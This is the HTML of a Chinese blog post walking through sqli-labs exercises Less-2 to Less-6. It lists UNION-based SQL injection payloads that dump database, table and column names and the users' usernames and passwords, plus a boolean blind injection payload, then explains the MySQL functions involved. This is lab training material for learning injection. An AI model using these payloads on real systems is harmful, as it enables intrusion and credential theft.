@@ -1,0 +1,1065 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="Sqli-Labs-Less-2~6, 书鱼">
+    <meta name="description" content="一、Introduction第2~4题和Less-1的差不多其实，到了第五题,第六题开始盲注有点难了，学了一波mysql的操作还是有些收获
+二、HackLess-2传入一个单引号试探注入点，发现报错
+..... syntax to use ">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>Sqli-Labs-Less-2~6 | 书鱼</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+    
+    <script src="/libs/jquery/jquery.min.js"></script>
+    
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper head-container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">书鱼</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>起居注</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>书鱼是谁</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>快来膜大佬</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>私密相册</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">书鱼</div>
+        <div class="logo-desc">
+            
+            他浑身都是弱点，简直一无是处，但他靠着自己的力量一步步克服，最终成为了火影
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			起居注
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			书鱼是谁
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			快来膜大佬
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			私密相册
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/21.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <div class="description center-align post-title">
+                        Sqli-Labs-Less-2~6
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/Sql-Injection/">
+                                <span class="chip bg-color">Sql-Injection</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/Web/" class="post-category">
+                                Web
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2019-04-27
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    1.6k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    7 分
+                </div>
+                
+				
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+            
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h3 id="一、Introduction"><a href="#一、Introduction" class="headerlink" title="一、Introduction"></a>一、Introduction</h3><p>第2~4题和Less-1的差不多其实，到了第五题,第六题开始盲注有点难了，学了一波mysql的操作还是有些收获</p>
+<h3 id="二、Hack"><a href="#二、Hack" class="headerlink" title="二、Hack"></a>二、Hack</h3><h4 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h4><p>传入一个单引号试探注入点，发现报错</p>
+<pre><code>..... syntax to use near &#39;&#39; LIMIT 0,1&#39; at line 1</code></pre><a id="more"></a>
+<p>推测和Less-1唯一的区别在于没有单引号，只是用数字进行查询，例如</p>
+<pre><code>SELECT * FROM users WHERE id=$id LIMIT 0,1</code></pre><p>所以payload和Less-1差别只在于一个单引号</p>
+<pre><code>-1 union select 1,2,3 %23
+-1 union select 1,2,group_concat(schema_name) from information_schema.schemata%23
+-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema= &#39;security&#39;%23
+-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name= &#39;users&#39;%23
+-1 union select 1,group_concat(username),group_concat(password) from users%23</code></pre><h4 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h4><p>题目名字叫，Single quotes with twist string (基于错误的GET单引号变形字符型注入)<br>测试 ?id=1’ 得到</p>
+<pre><code>...... syntax to use near &#39;&#39;1&#39;&#39;) LIMIT 0,1&#39; at line 1</code></pre><p>猜测语句</p>
+<pre><code>SELECT * FROM users WHERE id=(&#39;$id&#39;) LIMIT 0,1</code></pre><p>所以通过前面加 -1’) 闭合前面 尾部加%23 （#的url编码）中间就可以为所欲为了</p>
+<pre><code>SELECT * FROM users WHERE id=(&#39;   -1&#39;){{为所欲为}}#23    &#39;) LIMIT 0,1</code></pre><p>所以payload</p>
+<pre><code>-1&#39;)union select 1,2,3 %23
+-1&#39;)union select 1,2,group_concat(schema_name) from information_schema.schemata%23&#39;
+-1&#39;)union select 1,group_concat(table_name),3 from information_schema.tables where table_schema= &#39;security&#39;%23
+-1&#39;)union select 1,2,group_concat(column_name) from information_schema.columns where table_name= &#39;users&#39;%23
+-1&#39;)union select 1,group_concat(username),group_concat(password) from users%23</code></pre><h4 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h4><p>尝试’并未发现报错，尝试”发现报错</p>
+<pre><code>syntax to use near &#39;&quot;1&quot;&quot;) LIMIT 0,1&#39; at line 1</code></pre><p>猜测语句</p>
+<pre><code>SELECT * FROM users WHERE id=(&quot;$id&quot;) LIMIT 0,1</code></pre><p>所以payload和3差不多只是单引号变双引号</p>
+<pre><code>-1&quot;)union select 1,2,3 %23
+-1&quot;)union select 1,2,group_concat(schema_name) from information_schema.schemata%23&#39;
+-1&quot;)union select 1,group_concat(table_name),3 from information_schema.tables where table_schema= &#39;security&#39;%23
+-1&quot;)union select 1,2,group_concat(column_name) from information_schema.columns where table_name= &#39;users&#39;%23
+-1&quot;)union select 1,group_concat(username),group_concat(password) from users%23</code></pre><h4 id="Less-5-在导航页里显示的是要使用双查询"><a href="#Less-5-在导航页里显示的是要使用双查询" class="headerlink" title="Less-5 在导航页里显示的是要使用双查询"></a>Less-5 在导航页里显示的是要使用双查询</h4><p>发现正常或者注入成功是这样的<br><img src="2.png" alt=""><br>而一旦出错会报错<br><img src="1.png" alt=""><br>显然是布尔注入而且猜测语句</p>
+<pre><code>SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1</code></pre><p>当然就可以很多操作了，通过substr()、ascii()爆破也能得到一切<br>打个比方</p>
+<pre><code>1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;80%23     
+//截取数据库下第一个表的第一个字符与80ascii值进行对比
+
+找第二个字符只需要改成substr(&#39;xxx&#39;,2,1)即可。
+找第二个表改成limit 1,1</code></pre><p>也可以直接拿这个盲注脚本爆破，参数自己改就行了<br><img src="4.png" alt=""><br><a href="https://github.com/Kit4y/Sql-Injection/blob/master/Src/Script/Bool-injection.py" target="_blank" rel="noopener">https://github.com/Kit4y/Sql-Injection/blob/master/Src/Script/Bool-injection.py</a></p>
+<h4 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h4><p>Less-6和Less-5的关系就和1♂2，3♂4的关系一样 把’改成”在脚本上修改就很行了</p>
+<h3 id="三、补上一次的遗漏知识点"><a href="#三、补上一次的遗漏知识点" class="headerlink" title="三、补上一次的遗漏知识点"></a>三、补上一次的遗漏知识点</h3><h4 id="3-1、MySql–三种注释写法"><a href="#3-1、MySql–三种注释写法" class="headerlink" title="3.1、MySql–三种注释写法"></a>3.1、MySql–三种注释写法</h4><h5 id="3-1-1、"><a href="#3-1-1、" class="headerlink" title="3.1.1、--"></a>3.1.1、<code>--</code></h5><p>后面一定要加空格</p>
+<h5 id="3-1-2、"><a href="#3-1-2、" class="headerlink" title="3.1.2、#"></a>3.1.2、<code>#</code></h5><h5 id="3-1-3、"><a href="#3-1-3、" class="headerlink" title="3.1.3、/**/"></a>3.1.3、<code>/**/</code></h5><h4 id="3-2、注入尾部为什么是-而不是"><a href="#3-2、注入尾部为什么是-而不是" class="headerlink" title="3.2、注入尾部为什么是--+而不是--"></a>3.2、注入尾部为什么是<code>--+</code>而不是<code>--</code></h4><p>这里字符-和字符+在URL中都是有固定的含义的 , 比如说+就在URL编码中就代表空格 , 而URL编码中-不用编码。我们也可以不用+ 而使用空格的URL编码 , 那么编码得到的URL就应该是 :</p>
+<pre><code>id=1%27--%20</code></pre><h4 id="3-3、-又为什么必须得编码-不编码可以吗"><a href="#3-3、-又为什么必须得编码-不编码可以吗" class="headerlink" title="3.3、#又为什么必须得编码 , 不编码可以吗 ?"></a>3.3、<code>#</code>又为什么必须得编码 , 不编码可以吗 ?</h4><p>不可以 , 因为# 在URL中是有固定的含义的 , 表示页面中的锚点 , 如果不进行编码浏览器就会将其当成页面的锚点 , 而这里我们是需要将其作为数据传输给服务器的 , 因此需要进行URL编码</p>
+<h3 id="四、补充mysql的一些函数"><a href="#四、补充mysql的一些函数" class="headerlink" title="四、补充mysql的一些函数"></a>四、补充mysql的一些函数</h3><h4 id="4-1、substr"><a href="#4-1、substr" class="headerlink" title="4.1、substr()"></a>4.1、substr()</h4><p>substr()函数是用来截取数据库某一列字段中的一部分<br>常用的方式是： </p>
+<pre><code>SBUSTR(str,pos); </code></pre><p>就是从pos开始的位置，一直截取到最后。</p>
+<pre><code>SUBSTR(str,pos,len);</code></pre><p>这种表示的意思是，就是从pos开始的位置，截取len个字符(空白也算字符)。<br>需要注意的是：如果pos为1(而不是0)，表示从第一个位置开始。<br>这点也很好理解，因为数据库不是我们平时写程序，他有他自己的一套习惯，数据库的记录都是从1开始没有从0开始</p>
+<h4 id="4-2、ascii-ord-函数"><a href="#4-2、ascii-ord-函数" class="headerlink" title="4.2、ascii(),ord()函数"></a>4.2、ascii(),ord()函数</h4><p>ASCII(str1)<br>返回字符串str的最左面字符的ASCII代码值。如果str是空字符串，返回0。如果str是NULL，返回NULL</p>
+<pre><code>mysql&gt; select ascii(&quot;a&quot;);
++------------+
+| ascii(&quot;a&quot;) |
++------------+
+|         97 |
++------------+
+1 row in set (0.00 sec)</code></pre><p>ORD() 函数<br>ORD() 函数返回字符串第一个字符的ASCII 值。</p>
+<pre><code>mysql&gt; select ord(&quot;a&quot;);
++----------+
+| ord(&quot;a&quot;) |
++----------+
+|       97 |
++----------+
+1 row in set (0.00 sec)</code></pre><h4 id="4-3、LEFT-函数是一个字符串函数，它返回具有指定长度的字符串的左边部分。"><a href="#4-3、LEFT-函数是一个字符串函数，它返回具有指定长度的字符串的左边部分。" class="headerlink" title="4.3、LEFT()函数是一个字符串函数，它返回具有指定长度的字符串的左边部分。"></a>4.3、LEFT()函数是一个字符串函数，它返回具有指定长度的字符串的左边部分。</h4><pre><code>LEFT(str,length);</code></pre><p>LEFT()函数接受两个参数：<br>str是要提取子字符串的字符串。length是一个正整数，指定将从左边返回的字符数。</p>
+<pre><code>mysql&gt; select left(&quot;hello Kitty&quot;,5);
++-----------------------+
+| left(&quot;hello Kitty&quot;,5) |
++-----------------------+
+| hello                 |
++-----------------------+
+1 row in set (0.00 sec)</code></pre><p>与之类似的是right(str,length);</p>
+<pre><code>mysql&gt; select right(&quot;hello Kitty&quot;,5);
++------------------------+
+| right(&quot;hello Kitty&quot;,5) |
++------------------------+
+| Kitty                  |
++------------------------+
+1 row in set (0.00 sec)</code></pre><h4 id="4-4、REGEXP"><a href="#4-4、REGEXP" class="headerlink" title="4.4、REGEXP"></a>4.4、REGEXP</h4><p>可以在不使用数据库表的情况下用 SELECT 语句来测试正则表达式，REGEXP 检查总是返回0（没有匹配）或1（匹配）。可以用带文字串的 REGEXP 来测试表达式，并试验它们。</p>
+<pre><code>mysql&gt; SELECT &#39;kitty&#39; REGEXP &#39;[0-9a-z]{6}&#39;;
++------------------------------+
+| &#39;kitty&#39; REGEXP &#39;[0-9a-z]{6}&#39; |
++------------------------------+
+|                            0 |
++------------------------------+
+1 row in set (0.00 sec)</code></pre><pre><code>mysql&gt; SELECT &#39;kitty&#39; REGEXP &#39;[0-9a-z]{5}&#39;;
++------------------------------+
+| &#39;kitty&#39; REGEXP &#39;[0-9a-z]{5}&#39; |
++------------------------------+
+|                            1 |
++------------------------------+
+1 row in set (0.00 sec)</code></pre><h4 id="4-5、MID"><a href="#4-5、MID" class="headerlink" title="4.5、MID()"></a>4.5、MID()</h4><pre><code>SELECT MID(column_name,start[,length]) FROM table_name;</code></pre><p>函数用于从文本字段中提取字符。</p>
+<pre><code>+----+--------------+---------------------------+-------+---------+
+| id | name         | url                       | alexa | country |
++----+--------------+---------------------------+-------+---------+
+| 1  | Google       | https://www.google.cm/    | 1     | USA     |
+| 2  | 淘宝          | https://www.taobao.com/   | 13    | CN      |
+| 3  | 菜鸟教程      | http://www.runoob.com/    | 4689  | CN      |
+| 4  | 微博          | http://weibo.com/         | 20    | CN      |
+| 5  | Facebook      | https://www.facebook.com/ | 3     | USA     |
+| 7  | stackoverflow | http://stackoverflow.com/ |   0 | IND     |
++----+---------------+---------------------------+-------+---------+</code></pre><pre><code>SELECT MID(name,1,4) AS ShortTitle
+FROM Websites;</code></pre><p>返回结果<br><img src="3.png" alt=""></p>
+<h4 id="4-6、if"><a href="#4-6、if" class="headerlink" title="4.6、if()"></a>4.6、if()</h4><p> 在mysql中if()函数的用法类似于java中的三目表达式，其用处也比较多，具体语法如下：</p>
+<p>IF(expr1,expr2,expr3)，如果expr1的值为true，则返回expr2的值，如果expr1的值为false，</p>
+<pre><code>mysql&gt; select name,if(sex=0,&#39;女&#39;,&#39;男&#39;) as sex from student;
++-------+-----+
+| name  | sex |
++-------+-----+
+| name1 | 女  |
+| name2 | 女  |
+| name3 | 男  |
+| name4 | 女  |
++-------+-----+
+rows in set (0.00 sec)</code></pre>
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://kit4y.github.io" rel="external nofollow noreferrer">st4ck</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://kit4y.github.io/2019/04/27/sqli-labs-less-2-6/">https://kit4y.github.io/2019/04/27/sqli-labs-less-2-6/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="https://kit4y.github.io" target="_blank">st4ck</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/Sql-Injection/">
+                                    <span class="chip bg-color">Sql-Injection</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2019/04/28/sqli-labs-less7-10-ji-yu-shi-jian-mang-zhu/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="Sqli-Labs-Less7~10&&基于时间盲注">
+                        
+                        <span class="card-title">Sqli-Labs-Less7~10&&基于时间盲注</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            新知识点：第七题提示Dump into outfile，即使用文件导出，然后第九第十题通过基于时间盲注的脚本也拿到了数据库所有数据，慢慢锻炼自己写py的能力吧。Less-7本关的标题是dump into outfile,意思是本关我们利用文
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2019-04-28
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Web/" class="post-category">
+                                    Web
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Sql-Injection/">
+                        <span class="chip bg-color">Sql-Injection</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2019/04/18/sqli-labs-sqlmap-ji-chu-pian/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="Sqli-Labs&&Sqlmap-基础篇">
+                        
+                        <span class="card-title">Sqli-Labs&&Sqlmap-基础篇</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            一、IntroductionSqli-labs是一个印度程序员写的，用来学习sql注入的一个游戏教程官方地址传送门 https://github.com/Audi-1/sqli-labs至于环境搭建，可以通过docker部署一下或者phpS
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2019-04-18
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Web/" class="post-category">
+                                    Web
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Sql-Injection/">
+                        <span class="chip bg-color">Sql-Injection</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: 书鱼<br />'
+            + '文章作者: st4ck<br />'
+            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归书鱼所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+    
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+<style type="text/css">
+code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
+</style>
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            // headingsOffset: -205,
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+    <footer class="page-footer bg-color">
+    <div class="container row center-align">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            <span id="year">年份</span>
+            <a href="https://kit4y.github.io" target="_blank">st4ck</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
